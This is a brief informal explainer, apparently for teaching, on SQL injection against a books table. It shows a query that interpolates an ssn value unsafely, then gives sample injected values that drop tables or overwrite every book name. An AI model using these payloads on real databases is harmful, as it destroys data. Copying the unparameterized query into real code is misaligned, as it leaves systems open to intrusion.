so, here are a few different sql examples to attmept to do things within the database:

'; DROP TABLE books; --


this would be the normal command to find books based upon an ssn number:
UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';

however, we could craft a particular ssn number in order to trip the system out:
12345'; UPDATE books SET book_name = 'Hacked'; --

we could also do something like:

12345'; DROP TABLE hello;--
